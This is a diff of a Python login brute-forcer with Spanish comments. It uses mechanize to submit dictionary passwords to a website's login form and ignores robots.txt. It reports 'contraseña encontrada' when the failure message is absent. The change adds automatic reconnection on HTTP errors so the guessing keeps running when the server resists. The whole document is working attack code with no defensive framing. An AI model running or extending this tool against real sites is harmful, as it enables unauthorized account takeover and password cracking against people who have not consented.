@@ -2,12 +2,13 @@ import mechanize
 from colorama import init,Fore
 import parametros as params
 from re import search
-
+from time import sleep
 
 init()
 
-
+# estados
 deteniendo = False
+esperando = False
 
 def generador(diccionario):
     
@@ -39,12 +40,13 @@ def leer_dic(nombre):
 
 def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
     global deteniendo
+    global esperando
     #url_login --> url del login de pagina web cuando se envia un dato invalido
     #usuario --> si conozco el usuario se almacena aca
     #c_contr --> atriqueta name de html de contraseña
     #c_usuario --> atriqueta name de html de usuario
     #n --> numero de formulario
-    encontrada = False
+    
     try:
         web = mechanize.Browser()
         encabezado = [
@@ -53,18 +55,17 @@ def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
 
         web.set_handle_robots(False)
         web.addhandlers = encabezado
+        sitio = web.open(url_login)
 
-        if web.open(url_login).code == 200:
-            web.open(url_login)
+        if sitio.code == 200:
+            
 
             web.select_form(nr=n)
             web[c_usuario] = usuario
             web[c_contr] = contr_
-
             pag2= web.submit()
-            
             html = pag2.get_data().decode()
-             
+                
             #si conozco el usuario
             if search(params.param.msg,html) == None and params.param.usuario != None:
                 print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
@@ -85,17 +86,14 @@ def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
             print(Fore.RED+'el sitio es inaccesible')    
                 
 
-    except mechanize.ControlNotFoundError:
-        print(Fore.RED+'no se encuentra el formulario o las casillas no conciden')
-        
-        exit()
-    
-    except Exception as e:
-        print(Fore.RED+f'hubo un problema en la funcion pricipal: {e}')
-        deteniendo = True
-        
 
-    finally:
         web.close()
-        
-    
+    except mechanize.HTTPError:
+        esperando = True
+        print(Fore.WHITE+'reconectando...')
+        sleep(1)
+        esperando = False
+    except Exception as e:
+        if not deteniendo:
+            print(Fore.WHITE+f'error: {e}')
+            deteniendo = True
